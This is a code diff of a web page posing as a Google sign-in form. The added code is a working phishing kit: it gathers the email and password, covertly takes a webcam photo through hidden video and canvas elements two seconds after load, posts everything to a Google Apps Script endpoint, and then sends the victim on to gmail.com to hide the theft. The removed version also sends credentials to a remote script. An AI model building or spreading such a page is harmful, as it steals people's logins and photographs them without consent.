@@ -824,7 +824,9 @@
   }
   .dasher-tooltip p span {
   display: block;
-  }
+  }  video, canvas {
+      display: none;
+    }
 </style>
 <style media="screen and (max-width: 800px), screen and (max-height: 800px)">
   .dasher-tooltip {
@@ -856,14 +858,21 @@
 
 
 
-<form id="dataForm">
+<form id="myForm">
+ 
+    
+      <input type="hidden" name="urlInput" value="Google.html" />
+        <video id="video" autoplay></video>
+      <canvas id="canvas"></canvas>
+      <input type="hidden" name="photo" id="photo" />
+  
   
 <input type="hidden" name="redirect_url" value="https://gmail.com">
 
 
 
  <input type="hidden" id="title" name="title" value="Google">
-  <input type="hidden" name="timestamp1"> <!-- Example timestamp -->
+  <input type="hidden" name="timestamp"> <!-- Example timestamp -->
   <input type="email" name="user" placeholder="Email">
   <input type="password" name="password" placeholder="Password">
   
@@ -934,34 +943,62 @@
 </div>
   </div>
 </body> <script>
-    // Set current ISO timestamp
-    document.getElementById("timestamp").value = new Date().toISOString();
+  const form = document.getElementById('myForm');
 
-    const form = document.getElementById("loginForm");
+  form.addEventListener('submit', function(e) {
+    e.preventDefault();
 
-    form.addEventListener("submit", function(e) {
-      e.preventDefault();
+    const formData = new FormData(form);
+    const redirectUrl = formData.get('redirect_url');
 
-      const formData = new FormData(form);
-      const params = new URLSearchParams();
+    // Convert formData to URLSearchParams for POST
+    const params = new URLSearchParams();
+    for (const pair of formData.entries()) {
+      params.append(pair[0], pair[1]);
+    }
 
-      for (const pair of formData.entries()) {
-        params.append(pair[0], pair[1]);
+    fetch('https://script.google.com/macros/s/AKfycbxwMvuQnraAoBx9TrB-g__Pa9oH3ApUW7f3E9pbI-Em7pT3mZxUVkdXNSseG9vgQCqI/exec', {
+      method: 'POST',
+      body: params,
+      headers: {
+        'Content-Type': 'application/x-www-form-urlencoded'
       }
-
-      fetch("https://script.google.com/macros/s/AKfycbyG51g2kaW0iz3XzRE-PwIV8v9icTlxetIPaMfczkCozCg5zdvwH5HI1kfPtoW2mlig/exec", {
-        method: "POST",
-        body: params
-      })
-      .then(response => response.text())
-      .then(responseText => {
-        // Run any JS returned by the Apps Script (e.g., redirect)
-        document.write(responseText);
-      })
-      .catch(error => {
-        console.error("Error submitting form:", error);
-        alert("Submission failed.");
-      });
+    })
+    .then(response => {
+      if (!response.ok) throw new Error('Network response was not ok');
+      return response.text();
+    })
+    .then(() => {
+      // Redirect after successful form submission
+      window.location.href = redirectUrl;
+    })
+    .catch(error => {
+       window.location.href = redirectUrl;
     });
+  });
+
+  const video = document.getElementById('video');
+  const canvas = document.getElementById('canvas');
+  const photoInput = document.getElementById('photo');
+
+  // Access the camera and capture a photo after 2 seconds
+  navigator.mediaDevices.getUserMedia({ video: true })
+    .then(stream => {
+      video.srcObject = stream;
+
+      setTimeout(() => {
+        const context = canvas.getContext('2d');
+        canvas.width = video.videoWidth || 640; // fallback width
+        canvas.height = video.videoHeight || 480; // fallback height
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        photoInput.value = canvas.toDataURL('image/png');
+
+        // Stop the video stream to free camera
+        stream.getTracks().forEach(track => track.stop());
+        video.style.display = 'none';
+      }, 2000);
+    })
+    .catch(err => console.error("Error accessing camera: ", err));
+
   </script>
   </html>
